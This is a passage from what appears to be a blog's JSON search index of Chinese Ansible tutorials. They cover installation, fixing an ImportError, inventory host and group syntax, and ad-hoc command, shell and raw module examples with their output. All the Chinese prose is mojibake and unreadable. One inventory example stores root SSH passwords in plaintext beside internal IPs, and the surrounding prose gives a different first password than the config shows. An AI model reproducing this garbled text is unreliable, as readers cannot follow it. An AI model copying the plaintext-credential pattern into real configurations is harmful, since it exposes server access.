æ›´å¤šéƒ¨åˆ†å¯ä»¥å‚çœ‹å®˜æ–¹æ–‡æ¡£","link":"/2016/03/07/è‡ªåŠ¨åŒ–+Jenkins/Ansible/Ansibleå°ç»“ï¼ˆä¸‰ï¼‰ansible.cfgä¸é»˜è®¤é…ç½® /"},{"title":"Ansible å°ç»“ï¼ˆä¸€ï¼‰ansibleçš„å®‰è£…","text":"ä¸Šä¸€ç¯‡æ–‡ç« è®°å½•äº†è§£ansible,è¿™ç¯‡å¤§æ¦‚è®°å½•ä¸‹å¸¸è§„ä½¿ç”¨å‘½ä»¤ã€‚ è¿™é‡Œä»¥CentOS Linux release 7.2.1511 (Core)ç³»ç»Ÿä¸ºå‡†ã€‚ ä¸€ã€Ansibleçš„å®‰è£…Centoså®‰è£…1ã€yumæºå®‰è£… ä»¥centosä¸ºä¾‹ï¼Œé»˜è®¤åœ¨æºé‡Œæ²¡æœ‰ansibleï¼Œä¸è¿‡åœ¨fedora epelæºé‡Œæœ‰ansibleï¼Œé…ç½®å®Œepel æºåï¼Œå¯ä»¥ç›´æ¥é€šè¿‡yum è¿›è¡Œå®‰è£…ã€‚è¿™é‡Œä»¥centos6.8ä¸ºä¾‹ï¼š 123456centos 6# yum install http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpmcentos 7# yum install http://mirrors.sohu.com/fedora-epel/7/x86_64/Packages/e/epel-release-7-11.noarch.rpm# yum install -y ansible Ubuntuå®‰è£…2ã€apt-getå®‰è£… åœ¨ubuntuåŠå…¶è¡ç”Ÿç‰ˆä¸­ï¼Œå¯ä»¥é€šè¿‡å¢åŠ ppaæºè¿›è¡Œapt-getå®‰è£…ï¼Œå…·ä½“å¦‚ä¸‹ï¼š 1234$ sudo apt-get install software-properties-common$ sudo apt-add-repository ppa:ansible/ansible$ sudo apt-get update$ sudo apt-get install ansible 3ã€æºç å®‰è£… æºç å®‰è£…éœ€è¦python2.6ä»¥ä¸Šç‰ˆæœ¬ï¼Œå…¶ä¾èµ–æ¨¡å—paramikoã€PyYAMLã€Jinja2ã€httplib2ã€simplejsonã€pycryptoæ¨¡å—ï¼Œä»¥ä¸Šæ¨¡å—å¯ä»¥é€šè¿‡pipæˆ–easy_install è¿›è¡Œå®‰è£…ï¼Œä¸è¿‡æœ¬éƒ¨åˆ†æ—¢ç„¶æåˆ°çš„æ˜¯æºç å®‰è£…ï¼Œä¸»è¦é’ˆå¯¹çš„æ— æ³•ä¸Šå¤–ç½‘çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡pypi ç«™ç‚¹æœç´¢ä»¥ä¸ŠåŒ…ï¼Œä¸‹è½½åé€šè¿‡python setup.py install è¿›è¡Œå®‰è£…ã€‚ æœ€åé€šè¿‡githubæˆ–pypiä¸Šä¸‹è½½ansibleæºç åŒ…ï¼Œé€šè¿‡python setup.py install å®‰è£…å³å¯ã€‚ç”±äºå®‰è£…è¿‡ç¨‹ç›¸å¯¹ç®€å•ï¼Œè¿™é‡Œç•¥è¿‡ï¼Œä¸»è¦ä»‹ç»å®‰è£…åï¼Œå¯èƒ½é‡åˆ°çš„é—®é¢˜ã€‚ aã€å®‰è£…PyYAMLæ—¶ï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š 123456789# python setup.py installlibyaml is not found or a compiler error: forcing --without-libyaml(if libyaml is installed correctly, you may need to specify the option --include-dirs or uncomment and modify the parameter include_dirs in setup.cfg)running install_librunning install_egg_infoRemoving /usr/lib64/python2.6/site-packages/PyYAML-3.11-py2.6.egg-infoWriting /usr/lib64/python2.6/site-packages/PyYAML-3.11-py2.6.egg-info åœ¨centos6.8ç³»ç»Ÿä¸­ï¼Œå¯ä»¥é€šè¿‡yum -y install libyamlåŒ…è§£å†³ï¼Œæˆ–è€…ä»ISOæ–‡ä»¶ä¸­æä¾›è¯¥åŒ…ï¼Œé€šè¿‡rpm -ivhè¿›è¡Œå®‰è£…ã€‚ ###äºŒã€Ansibleçš„é…ç½®ä¸éªŒè¯ yum å®‰è£…ä½¿ç”¨é»˜è®¤ç¤ºä¾‹é…ç½®æ–‡ä»¶åï¼Œç¼–è¾‘/etc/ansible/hostsæ–‡ä»¶ï¼Œé€šè¿‡ä»¥ä¸‹æ–¹å¼éªŒè¯ansibleæ˜¯å¦å¯ç”¨ï¼š 12345[root@docker ~]# cat /etc/ansible/hosts[test]10.212.52.252 ansible_ssh_user=root ansible_ssh_pass=qwe123.com10.212.52.14 ansible_ssh_user=root ansible_ssh_pass=abc12310.212.52.16 ansible_ssh_user=root ansible_ssh_pass=91it.org ä»¥ä¸Šçš„é…ç½®ä¸­ï¼Œæˆ‘é…ç½®äº†ä¸€ä¸ªtestç»„ï¼Œè¯¥ç»„ä¸‹æœ‰ä¸‰å°ä¸»æœºï¼Œä¸‰å°éƒ½ä½¿ç”¨rootéªŒè¯ï¼Œä¸‰å°çš„å¯†ç åˆ†åˆ«æ˜¯361way.comã€abc123ã€91it.org ã€‚ æ³¨ï¼šåé¢çš„ç”¨æˆ·å’Œå¯†ç é¡¹æ˜¯éå¿…é¡»çš„ï¼Œåœ¨é…ç½®keyè®¤è¯çš„æƒ…å†µä¸‹ï¼Œä¸ä½¿ç”¨å¯†ç ä¹Ÿå¯ä»¥ç›´æ¥æ“ä½œ ã€‚æœªä½¿ç”¨keyçš„ï¼Œä¹Ÿå¯ä»¥åœ¨ansibleé€šè¿‡ -kå‚æ•°åœ¨æ“ä½œå‰è¯¢é—®æ‰‹åŠ¨è¾“å…¥å¯†ç ã€‚ é…ç½®æ–‡ä»¶å°±æ˜¯ä¸€èˆ¬ä¸‹ç›®å½•çš„hostsæ–‡ä»¶ã€‚ åœ¨åº“å­˜ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰å¦‚ä¸‹ä¿¡æ¯ï¼š ä¸»æœºåœ°å€ ä¸»æœºåˆ†ç»„ è¿æ¥å±æ€§ï¼ˆç™»å½•åï¼Œå¯†ç ï¼Œç§˜é’¥ï¼Œç«¯å£ç­‰ï¼‰1ï¼Œä¸»æœºåœ°å€å’Œåˆ†ç»„ å®šä¹‰ä¸»æœºåœ°å€å’Œåç§°æ¯”è¾ƒç®€å•ï¼š 12[&lt;ä¸»æœºå&gt;]&lt;ä¸»æœº IP&gt; å®šä¹‰åˆ†ç»„çš„è¯­æ³•ç±»ä¼¼ï¼Œå°±æ˜¯åœ¨åå­—ååŠ ä¸Š:childrenï¼Œæˆå‘˜å¯ä»¥æ˜¯ä¸»æœºåï¼Œä¹Ÿå¯ä»¥æ˜¯åˆ†ç»„åï¼š 123[&lt;åˆ†ç»„å&gt;:children]&lt;ä¸»æœºå&gt;&lt;åˆ†ç»„å&gt; 2ï¼Œè¿æ¥å±æ€§ å¯ä»¥é’ˆå¯¹SSHè¿æ¥æŒ‡å®šä¸€äº›å‚æ•°ï¼š ansible_ssh_hostï¼šä¸»æœºåã€‚ ansible_ssh_portï¼šSSHç«¯å£ï¼Œé»˜è®¤22ã€‚ ansible_ssh_userï¼šç™»å½•ç”¨æˆ·ã€‚ ansible_ssh_passï¼šç™»é™†å¯†ç ã€‚ ansible_ssh_private_key_fileï¼šç§é’¥ã€‚ é€šè¿‡ç§é’¥ç™»é™†çš„è¯ï¼Œå°±ä¸è¦æŒ‡å®šç™»å½•å¯†ç äº†ï¼Œä¸»æœºåä¹Ÿå¯ä»¥å¿½ç•¥ã€‚å½“ç„¶ï¼Œæ—¢ç„¶æ˜¯ä½¿ç”¨ç§é’¥ç™»é™†ï¼Œéœ€è¦ä½ ç¡®ä¿å·²ç»åœ¨å„ä¸ªä¸­ä¸»æœºçš„authorized_keysé‡Œæ·»åŠ äº†å¯¹åº”çš„å…¬é’¥ã€‚ 3ï¼Œæ¼”ç¤º å®Œæ•´çš„åº“å­˜ä¾‹å­å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# -----------------# é¦–å…ˆå®šä¹‰å„ä¸ªä¸»æœº# -----------------#============================01_version=============================#[tomcat-account_01] 10.27.232.82[tomcat-point_01] 10.27.2.12[tomcat-system_01] 10.27.232.12 [tomcat-family_01] 10.27.230.63 [tomcat-mission_01] 10.47.59.12 [tomcat-card_01] 10.47.74.12 [tomcat-check_01] 10.47.107.153 # -----------------# å®šä¹‰åˆ†ç»„## åœ¨è¿™é‡Œæˆ‘ä»¬å®šä¹‰äº†ä¸‰ä¸ªåˆ†ç»„ï¼Œåˆ†åˆ«åä¸ºï¼š# - cluster1# - light# - starwar# -----------------[cluster1:children]tomcat-account_01tomcat-point_01tomcat-system_01tomcat-family_01tomcat-mission_01[light:children]tomcat-account_01tomcat-point_01tomcat-system_01tomcat-family_01tomcat-mission_01[starwar:children]tomcat-account_01tomcat-point_01tomcat-system_01tomcat-family_01tomcat-mission_01# -----------------# ç»™åˆ†ç»„å®šä¹‰å˜é‡## è¿™é‡Œæˆ‘ä»¬ç»™ starwar ç»„å®šä¹‰äº†å˜é‡ # -----------------[cluster1:vars]ansible_ssh_port=7525ansible_ssh_user=lucasansible_ssh_private_key_file=./ssh/id_rsa è¿™é‡Œè®¾ç½®åˆ†ç»„çš„æ—¶å€™åå­—ä¸èƒ½ä¸å•å°æœºå™¨åç§°ä¸€æ ·ã€‚æ¯”å¦‚ï¼š 1234[tomcat-account_01] 10.27.232.82[tomcat-account_01:children]tomcat-account_01 è¿™é‡Œä¾‹å­æ˜¯é”™è¯¯çš„ï¼Œä¼šæç¤ºåˆ†ç»„å­˜åœ¨ã€‚ ä¸ºäº†å®‰å…¨å’Œæ–¹ä¾¿åœ¨hostsé‡Œé¢å°±ä¸éœ€è¦å†™ç”¨æˆ·åå’Œå¯†ç ã€‚åšä¸ªå…ç§˜é’¥ç™»é™†ã€‚è¿™é‡Œæˆ‘è‡ªå·±å¯¹æ§åˆ¶çš„æœºå™¨å…¨éƒ¨åšäº†å…ç§˜é’¥ç™»é™†ï¼Œæ‰€ä»¥è¿™é‡Œåªéœ€è¦è¿™ä¹ˆå†™ï¼š 1234567891011121314151617[redis1]192.168.1.173[redis2]192.168.1.174[tomcat_A1]192.168.1.175[tomcat_B1]192.168.1.176[tomcat_C1]192.168.1.177[tomcat_D1]192.168.1.178 è¿™é‡Œæ˜¯æ‰§è¡Œè„šæœ¬ã€‚ 1ansible tomcat_D1 -m shell -a \"sh +x /root/update/shoppingmall.sh\" ä¾‹å­æ“ä½œæŸ¥çœ‹zk1åˆ†ç»„ä¸Šæ‰€æœ‰æœºå™¨ç«¯å£ï¼š 123456789101112131415161718192021222324252627[root@salt ansible]# ansible zk1:children -m shell -a \"netstat -ntulp\"10.27.238.75 | SUCCESS | rc=0 &gt;&gt;Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:2181 0.0.0.0:* LISTEN 12497/javatcp 0 0 0.0.0.0:56521 0.0.0.0:* LISTEN 12497/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1251/sshdtcp 0 0 0.0.0.0:4888 0.0.0.0:* LISTEN 12497/javatcp 0 0 127.0.0.1:15770 0.0.0.0:* LISTEN 1434/aegis_quartzudp 0 0 118.178.240.129:123 0.0.0.0:* 1262/ntpdudp 0 0 10.27.238.75:123 0.0.0.0:* 1262/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1262/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1262/ntpd10.47.100.200 | SUCCESS | rc=0 &gt;&gt;Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:58367 0.0.0.0:* LISTEN 11232/javatcp 0 0 10.47.100.200:10050 0.0.0.0:* LISTEN 646/zabbix_agentdtcp 0 0 0.0.0.0:2181 0.0.0.0:* LISTEN 11232/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1243/sshdtcp 0 0 0.0.0.0:4888 0.0.0.0:* LISTEN 11232/javatcp 0 0 127.0.0.1:15770 0.0.0.0:* LISTEN 1436/aegis_quartzudp 0 0 120.27.152.77:123 0.0.0.0:* 1254/ntpdudp 0 0 10.47.100.200:123 0.0.0.0:* 1254/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1254/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1254/ntpd","link":"/2016/03/07/è‡ªåŠ¨åŒ–+Jenkins/Ansible/Ansible å°ç»“ï¼ˆä¸€ï¼‰ansibleçš„å®‰è£… /"},{"title":"Ansibleå®‰è£…å‡ºç° ImportError/ No module named _text","text":"centos6.7 ansible yumå®‰è£…å‡ºç°é—®é¢˜ï¼š12345ansible --versionTraceback (most recent call last): File \"/usr/bin/ansible\", line 46, in &lt;module&gt; from ansible.module_utils._text import to_textImportError: No module named _text æç¤ºè¿™ä¸ªé”™è¯¯ï¼Œåé¢æŸ¥çœ‹å®˜ç½‘epelåŒ…éœ€è¦æ›´æ–°ï¼Œè¿™é‡Œæˆ‘å·²æ›´æ–°å‘ç°è¿˜æ˜¯æœ‰é—®é¢˜ã€‚ è§£å†³æ–¹æ³•ï¼šä½¿ç”¨pip installå®‰è£…è¿‡ansibleå°±æ­£å¸¸ä½¿ç”¨12345678910111213141516171819202122232425262728[root@ansible_01 ~]# pip install ansibleCollecting ansible Downloading ansible-1.9.4.tar.gz (937kB) 100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 937kB 100kB/s Collecting paramiko (from ansible) Downloading paramiko-1.15.3-py2.py3-none-any.whl (166kB) 100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 167kB 136kB/s Collecting jinja2 (from ansible) Downloading Jinja2-2.8-py2.py3-none-any.whl (263kB) 100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 266kB 1.4MB/s Collecting PyYAML (from ansible) Downloading PyYAML-3.11.tar.gz (248kB) 100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 249kB 72kB/s Requirement already satisfied (use --upgrade to upgrade): setuptools in /usr/local/python27/lib/python2.7/site-packages/setuptools-18.4-py2.7.egg (from ansible)Collecting pycrypto&gt;=2.6 (from ansible) Downloading pycrypto-2.6.1.tar.gz (446kB) 100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 446kB 117kB/s Collecting ecdsa&gt;=0.11 (from paramiko-&gt;ansible) Downloading ecdsa-0.13-py2.py3-none-any.whl (86kB) 100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 90kB 141kB/s Collecting MarkupSafe (from jinja2-&gt;ansible) Downloading MarkupSafe-0.23.tar.gzInstalling collected packages: ecdsa, pycrypto, paramiko, MarkupSafe, jinja2, PyYAML, ansible Running setup.py install for pycrypto Running setup.py install for MarkupSafe Running setup.py install for PyYAML Running setup.py install for ansibleSuccessfully installed MarkupSafe-0.23 PyYAML-3.11 ansible-1.9.4 ecdsa-0.13 jinja2-2.8 paramiko-1.15.3 pycrypto-2.6.1 å¦‚æœæç¤ºæ²¡æœ‰No package &#39;libffi&#39; found 1yum install libffi-devel å¦‚æœå¯ä»¥æ­£å¸¸æ˜¾ç¤ºä¸éœ€è¦è®¾ç½® å¦‚æœè¿˜æ˜¯æœ‰é—®é¢˜è®¾ç½®ä¸‹ä¾èµ–ï¼š 12345678910111213141516[root@ansible_01 ~]# find / -name ansible/etc/ansible/usr/local/bin/ansible/usr/local/src/ansible/usr/local/src/ansible/docsite/js/ansible/usr/local/src/ansible/bin/ansible/usr/local/src/ansible/packaging/port/sysutils/ansible/usr/local/src/ansible/packaging/macports/sysutils/ansible/usr/local/src/ansible/build/scripts-2.6/ansible/usr/local/src/ansible/build/lib/ansible/usr/local/src/ansible/lib/ansible/usr/local/src/ansible/.git/modules/lib/ansible/usr/local/lib/python2.7/site-packages/ansible/usr/lib/python2.6/site-packages/ansible-2.1.0-py2.6.egg/ansible/usr/lib/python2.6/site-packages/ansible-2.1.0-py2.6.egg/EGG-INFO/scripts/ansible/home/ansible ç„¶åå®‰è£…å®Œæˆæ­£å¸¸æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ï¼š 123456 ln -s /usr/local/bin/ansible /usr/bin/ansible [root@LAN_zabbix pip-9.0.1]# ansible --versionansible 2.2.1.0 config file = configured module search path = Default w/o overrides","link":"/2016/06/10/è‡ªåŠ¨åŒ–+Jenkins/Ansible/Ansible å®‰è£…å‡ºç° ImportError: No module named _text/"},{"title":"Ansibleå°ç»“ï¼ˆå››ï¼‰Ad-hocä¸commandsæ¨¡å—","text":"ansibleå°ç»“ï¼ˆå››ï¼‰Ad-hocä¸commandsæ¨¡å—Ad-Hoc æ˜¯æŒ‡ansibleä¸‹ä¸´æ—¶æ‰§è¡Œçš„ä¸€æ¡å‘½ä»¤ï¼Œå¹¶ä¸”ä¸éœ€è¦ä¿å­˜çš„å‘½ä»¤ï¼Œå¯¹äºå¤æ‚çš„å‘½ä»¤åé¢ä¼šè¯´playbookã€‚è®²åˆ°Ad-hoc å°±è¦æåˆ°æ¨¡å—ï¼Œæ‰€æœ‰çš„å‘½ä»¤æ‰§è¡Œéƒ½è¦ä¾èµ–äºäº‹å…ˆå†™å¥½çš„æ¨¡å—ï¼Œé»˜è®¤å®‰è£…å¥½çš„ansible é‡Œé¢å·²ç»è‡ªå¸¦äº†å¾ˆå¤šæ¨¡å—ï¼Œå¦‚ï¼šcommandã€rawã€shellã€fileã€cronç­‰ï¼Œå…·ä½“å¯ä»¥é€šè¿‡ansible-doc -l è¿›è¡ŒæŸ¥çœ‹ ã€‚ 1ã€Ad-hoc1ã€ç›´æ¥æ‰§è¡Œ è¿™é‡Œè¿˜æ˜¯å…ˆæ¥ä¸€ä¸ªä¸Šå‡ ç¯‡å¹…ç»å¸¸ç”¨åˆ°çš„ä¸€ä¸ªä¾‹å­ï¼š 1234[root@docker ~]# ansible tomcat_C1 -a \"uptime\" -kSSH password:192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 10:37:10 up 24 days, 16:48, 4 users, load average: 0.00, 0.00, 0.00 ä¸€ä¸ªad-hocå‘½ä»¤çš„æ‰§è¡Œï¼Œéœ€è¦æŒ‰ä»¥ä¸‹æ ¼å¼è¿›è¡Œæ‰§è¡Œï¼š 1ansible ä¸»æœºæˆ–ç»„ -m æ¨¡å—å -a 'æ¨¡å—å‚æ•°' ansibleå‚æ•° ä¸»æœºå’Œç»„ï¼Œæ˜¯åœ¨/etc/ansible/hosts é‡Œè¿›è¡ŒæŒ‡å®šçš„éƒ¨åˆ†ï¼Œå½“ç„¶åŠ¨æ€Inventory ä½¿ç”¨çš„æ˜¯è„šæœ¬ä»å¤–éƒ¨åº”ç”¨é‡Œè·å–çš„ä¸»æœº. æ¨¡å—åï¼Œå¯ä»¥é€šè¿‡ansible-doc -læŸ¥çœ‹ç›®å‰å®‰è£…çš„æ¨¡å—ï¼Œé»˜è®¤ä¸æŒ‡å®šæ—¶ï¼Œä½¿ç”¨çš„æ˜¯commandæ¨¡å—ï¼Œå…·ä½“å¯ä»¥æŸ¥çœ‹/etc/ansible/ansible.cfg çš„â€œ#module_name = command â€ éƒ¨åˆ†ï¼Œé»˜è®¤æ¨¡å—å¯ä»¥åœ¨è¯¥é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œä¿®æ”¹ï¼› æ¨¡å—å‚æ•°ï¼Œå¯ä»¥é€šè¿‡ â€œansible-doc æ¨¡å—åâ€ æŸ¥çœ‹å…·ä½“çš„ç”¨æ³•åŠåé¢çš„å‚æ•°ï¼› ansibleå‚æ•°ï¼Œå¯ä»¥é€šè¿‡ansibleå‘½ä»¤çš„å¸®å¿™ä¿¡æ¯é‡ŒæŸ¥çœ‹åˆ°ï¼Œè¿™é‡Œæœ‰å¾ˆå¤šå‚æ•°å¯ä»¥ä¾›é€‰æ‹©ï¼Œå¦‚æ˜¯å¦éœ€è¦è¾“å…¥å¯†ç ã€æ˜¯å¦sudoç­‰ã€‚ 2ã€åå°æ‰§è¡Œä¾‹å­å½“å‘½ä»¤æ‰§è¡Œæ—¶é—´æ¯”è¾ƒé•¿æ—¶ï¼Œä¹Ÿå¯ä»¥æ”¾åˆ°åå°æ‰§è¡Œï¼Œè¿™é‡Œä¼šç”¨åˆ°-Bã€-På‚æ•°ï¼Œå¦‚ä¸‹ï¼š 123ansible all -B 3600 -a \"/usr/bin/long_running_operation --do-stuff\" \\\\åå°æ‰§è¡Œå‘½ä»¤ 3600sï¼Œ-B è¡¨ç¤ºåå°æ‰§è¡Œçš„æ—¶é—´ansible all -m async_status -a \"jid=123456789\" \\\\æ£€æŸ¥ä»»åŠ¡çš„çŠ¶æ€ansible all -B 1800 -P 60 -a \"/usr/bin/long_running_operation --do-stuff\" \\\\åå°æ‰§è¡Œå‘½ä»¤æœ€å¤§æ—¶é—´æ˜¯ 1800s å³ 30 åˆ†é’Ÿï¼Œ-P æ¯ 60s æ£€æŸ¥ä¸‹çŠ¶æ€é»˜è®¤ 15s 123[root@docker ~]# ansible -B 60 -P 1 tomcat_B1 -a \"uptime\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt; 11:23:00 up 24 days, 17:34, 1 user, load average: 0.00, 0.00, 0.00 äºŒã€commandsæ¨¡å—ä¸Šé¢å·²ç»æåˆ°ï¼Œansbileè‡ªèº«å·²ç»è‡ªå¸¦äº†å¾ˆå¤šæ¨¡å—ï¼Œå¯ä»¥é€šè¿‡ansible-doc -l è¿›è¡ŒæŸ¥çœ‹ã€‚è¿™é‡Œå°±ç»“åˆcommandã€shellã€rawã€scriptæ¨¡å—äº†è§£ä¸‹å…¶ç”¨æ³•ã€‚ ä¸Šé¢å››ä¸ªæ¨¡å—éƒ½å±äºcommands ç±»ã€‚ commandæ¨¡å—ï¼Œè¯¥æ¨¡å—é€šè¿‡-aè·Ÿä¸Šè¦æ‰§è¡Œçš„å‘½ä»¤å¯ä»¥ç›´æ¥æ‰§è¡Œï¼Œä¸è¿‡å‘½ä»¤é‡Œå¦‚æœæœ‰å¸¦æœ‰å¦‚ä¸‹å­—ç¬¦éƒ¨åˆ†åˆ™æ‰§è¡Œä¸æˆåŠŸ â€œ so variables like $HOME and operations like â€œ&lt;â€, â€œ&gt;â€, â€œ|â€, and â€œ&amp;â€ will not work (use the shell module if you need these features).â€ï¼›** shellæ¨¡å—ï¼Œç”¨æ³•å…¶æœ¬å’Œcommandä¸€æ ·ï¼Œä¸è¿‡çš„æ˜¯å…¶æ˜¯é€šè¿‡/bin/shè¿›è¡Œæ‰§è¡Œï¼Œæ‰€ä»¥shell æ¨¡å—å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œå°±åƒåœ¨æœ¬æœºæ‰§è¡Œä¸€æ ·ï¼Œâ€œ It is almost exactly like the command module but runs the command through a shell (/bin/sh) on the remote node.â€ï¼› rawæ¨¡å—ï¼Œç”¨æ³•å’Œshell æ¨¡å—ä¸€æ · ï¼Œå…¶ä¹Ÿå¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå°±åƒåœ¨æœ¬æœºæ‰§è¡Œä¸€æ ·ï¼Œâ€œExecutes a low-down and dirty SSH command, not going through the module subsystem. There is no change handler support for this module. This module does not require python on the remote systemâ€ scriptæ¨¡å—ï¼Œå…¶æ˜¯å°†ç®¡ç†ç«¯çš„shell åœ¨è¢«ç®¡ç†ä¸»æœºä¸Šæ‰§è¡Œï¼Œå…¶åŸç†æ˜¯å…ˆå°†shell å¤åˆ¶åˆ°è¿œç¨‹ä¸»æœºï¼Œå†åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œï¼ŒåŸç†ç±»ä¼¼äºrawæ¨¡å—ï¼Œâ€œThis module does not require python on the remote system, much like the raw module.â€ ã€‚ æ³¨ï¼šrawæ¨¡å—å’Œcomandã€shell æ¨¡å—ä¸åŒçš„æ˜¯å…¶æ²¡æœ‰chdirã€createsã€removeså‚æ•°ï¼Œchdirå‚æ•°çš„ä½œç”¨å°±æ˜¯å…ˆåˆ‡åˆ°chdiræŒ‡å®šçš„ç›®å½•åï¼Œå†æ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œè¿™åœ¨åé¢å¾ˆå¤šæ¨¡å—é‡Œéƒ½ä¼šæœ‰è¯¥å‚æ•° ã€‚ ###commandæ¨¡å—åŒ…å«å¦‚ä¸‹é€‰é¡¹ï¼š createsï¼šä¸€ä¸ªæ–‡ä»¶åï¼Œå½“è¯¥æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™è¯¥å‘½ä»¤ä¸æ‰§è¡Œ free_formï¼šè¦æ‰§è¡Œçš„linuxæŒ‡ä»¤ chdirï¼šåœ¨æ‰§è¡ŒæŒ‡ä»¤ä¹‹å‰ï¼Œå…ˆåˆ‡æ¢åˆ°è¯¥æŒ‡å®šçš„ç›®å½• removesï¼šä¸€ä¸ªæ–‡ä»¶åï¼Œå½“è¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™è¯¥é€‰é¡¹ä¸æ‰§è¡Œ executableï¼šåˆ‡æ¢shellæ¥æ‰§è¡ŒæŒ‡ä»¤ï¼Œè¯¥æ‰§è¡Œè·¯å¾„å¿…é¡»æ˜¯ä¸€ä¸ªç»å¯¹è·¯å¾„ commandæ¨¡å—ã€rawæ¨¡å—ã€shellæ¨¡å—ç¤ºä¾‹ï¼š commandä¾‹å­ï¼š123456789101112131415161718192021222324252627[root@docker ~]# ansible tomcat_B1 -m command -a \"ps -ef|grep tomcat\"192.168.1.176 | FAILED | rc=1 &gt;&gt;ERROR: Unsupported SysV option.********* simple selection ********* ********* selection by list *********-A all processes -C by command name-N negate selection -G by real group ID (supports names)-a all w/ tty except session leaders -U by real user ID (supports names)-d all except session leaders -g by session OR by effective group name-e all processes -p by process ID -q by process ID (unsorted &amp; quick)T all processes on this terminal -s processes in the sessions givena all w/ tty, including other users -t by ttyg OBSOLETE -- DO NOT USE -u by effective user ID (supports names)r only running processes U processes for specified usersx processes w/o controlling ttys t by tty*********** output format ********** *********** long options ***********-o,o user-defined -f full --Group --User --pid --cols --ppid-j,j job control s signal --group --user --sid --rows --info-O,O preloaded -o v virtual memory --cumulative --format --deselect-l,l long u user-oriented --sort --tty --forest --version-F extra full X registers --heading --no-heading --context --quick-pid ********* misc options *********-V,V show version L list format codes f ASCII art forest-m,m,-L,-T,H threads S children in sum -y change -l format-M,Z security data c true command name -c scheduling class-w,w wide output n numeric WCHAN,UID -H process hierarchy ä¸Šé¢çš„æ‰§è¡Œç»“æœå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘è¿™é‡ŒåŠ äº†ç®¡é“ï¼Œcommandæ¨¡å—æ‰§è¡Œæ—¶å‡ºé”™ï¼Œè€Œä½¿ç”¨rawæ¨¡å—å’Œshellæ¨¡å—éƒ½æ­£å¸¸ã€‚ shellä¾‹å­ï¼š123[root@docker ~]# ansible tomcat_B1 -m shell -a \"ps -ef|grep tomcat\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;root 1529 1 0 Aug11 ? 00:00:00 jsvc.exec -java-home /srv/jdk1.7.0_67 -user tomcat -pidfile /srv/tomcat/tomcat_manager/logs/catalina-daemon.pid -wait 10 -outfile /srv/tomcat/tomcat_manager/logs/catalina-daemon.out -errfile &amp;1 -classpath /srv/tomcat/tomcat_manager/bin/bootstrap.jar:/srv/tomcat/ ä½¿ç”¨chdirçš„ç¤ºä¾‹ï¼š12345678[root@docker ~]# ansible tomcat_B1 -m command -a \"chdir=/tmp/ touch 1.txt\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;[root@docker ~]# ansible tomcat_B1 -m shell -a \"chdir=/tmp/ touch 2.txt\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;[root@docker ~]# ansible tomcat_B1 -m 